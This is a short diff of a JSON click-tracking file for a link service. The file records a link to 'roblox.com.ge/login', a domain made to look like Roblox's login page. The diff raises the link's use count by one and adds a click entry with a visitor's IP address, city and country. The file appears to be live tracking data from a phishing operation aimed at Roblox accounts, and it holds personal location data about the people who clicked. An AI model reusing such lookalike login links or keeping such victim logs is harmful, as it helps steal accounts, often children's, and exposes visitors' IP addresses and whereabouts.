@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1017,
+    "useCount": 1018,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8256,6 +8256,14 @@
         "city": "Kävlinge",
         "flag": "🇸🇪",
         "countryCode": "SE"
+      },
+      {
+        "timestamp": 1777225744865,
+        "ip": "91.214.52.92",
+        "country": "Poland",
+        "city": "Radlin",
+        "flag": "🇵🇱",
+        "countryCode": "PL"
       }
     ]
   },
